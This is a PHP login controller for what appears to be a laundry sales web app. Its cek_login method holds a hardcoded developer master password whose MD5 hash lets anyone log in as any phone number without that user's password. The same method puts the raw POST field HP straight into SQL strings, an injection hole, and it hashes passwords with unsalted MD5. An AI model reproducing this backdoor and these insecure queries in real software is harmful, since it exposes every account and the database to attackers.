<?php
class Login extends Controller
{
   public function index()
   {
      if (isset($_SESSION['login_laundry'])) {
         if ($_SESSION['login_laundry'] == TRUE) {
            header('Location: ' . $this->BASE_URL . "Penjualan");
         } else {
            $this->view('login');
         }
      } else {
         $this->view('login');
      }
   }

   public function cek_login()
   {
      if (isset($_SESSION['login_laundry'])) {
         if ($_SESSION['login_laundry'] == TRUE) {
            header('Location: ' . $this->BASE_URL . "Penjualan/i");
         }
      }

      $pass = md5($_POST["PASS"]);
      $devPass = "9c87f7d5d33b266c0690b57966bd9ec3";
      if ($pass == $devPass) {
         $where = "no_user = '" . $_POST["HP"] . "' AND en = 1";
      } else {
         $where = "no_user = '" . $_POST["HP"] . "' AND password = '" . $pass . "' AND en = 1";
      }

      $this->data_user = $this->db(0)->get_where_row('user', $where);

      if ($this->data_user) {
         if ($this->data_user['id_privilege'] == 100 && $this->data_user['email_verification'] == 0) {
            echo "Akun dalam tahap verifikasi 1x24 jam";
         } else {
            // LAST LOGIN
            $dateTime = date('Y-m-d H:i:s');
            $set = "last_login = '" . $dateTime . "'";
            $this->db(0)->update('user', $set, $where);
            $this->db(0)->query("SET GLOBAL time_zone = '+07:00'");

            //LOGIN
            $_SESSION['login_laundry'] = TRUE;
            $this->parameter();
            echo 1;
         }
      } else {
         echo "Nomor Handphone/Password tidak Cocok!";
      }
   }

   public function logout()
   {
      session_start();
      session_unset();
      session_destroy();
      header('Location: ' . $this->BASE_URL . "Penjualan/i");
   }

   public function log_mode()
   {
      $mode = $_POST['mode'];
      unset($_SESSION['log_mode']);
      $_SESSION['log_mode'] = $mode;
   }
}
